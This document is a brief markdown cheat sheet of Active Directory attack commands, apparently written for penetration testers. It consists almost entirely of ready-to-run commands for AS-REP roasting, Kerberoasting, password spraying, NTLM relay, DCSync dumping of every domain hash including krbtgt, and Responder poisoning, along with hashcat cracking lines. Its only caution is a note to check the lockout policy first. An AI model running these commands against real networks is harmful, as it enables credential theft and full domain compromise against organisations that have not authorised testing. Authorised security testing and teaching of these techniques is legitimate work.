# Active Directory Attacks

## AS-REP Roasting (no pre-auth users)

```bash
impacket-GetNPUsers domain.com/ -usersfile users.txt -dc-ip DC -format hashcat -outputfile asrep.txt
impacket-GetNPUsers domain.com/user:pass -dc-ip DC -format hashcat    # auto-find targets
hashcat -m 18200 asrep.txt rockyou.txt
```

## Kerberoasting (service accounts)

```bash
impacket-GetUserSPNs domain.com/user:pass -dc-ip DC -request -outputfile tgs.txt
hashcat -m 13100 tgs.txt rockyou.txt
```

## Password Spraying

```bash
# CHECK LOCKOUT POLICY FIRST
crackmapexec smb DC -u user -p pass --pass-pol

crackmapexec smb DC -u users.txt -p 'Season2026!' --continue-on-success
kerbrute passwordspray -d domain.com users.txt 'Welcome1!' --dc DC
```

## NTLM Relay (if SMB signing disabled)

```bash
crackmapexec smb RANGE --gen-relay-list nosigning.txt
impacket-ntlmrelayx -tf nosigning.txt -smb2support
# Trigger auth: force a machine to connect to you
```

## DCSync (need Domain Admin or Replication rights)

```bash
impacket-secretsdump domain.com/admin:pass@DC
impacket-secretsdump domain.com/admin@DC -hashes LM:NTLM
# Dumps EVERY hash in the domain including krbtgt
```

## Responder (LLMNR/NBT-NS poisoning)

```bash
sudo responder -I eth0
# Captures NTLMv2 hashes when users mistype share names
hashcat -m 5600 captured_hash.txt rockyou.txt
```
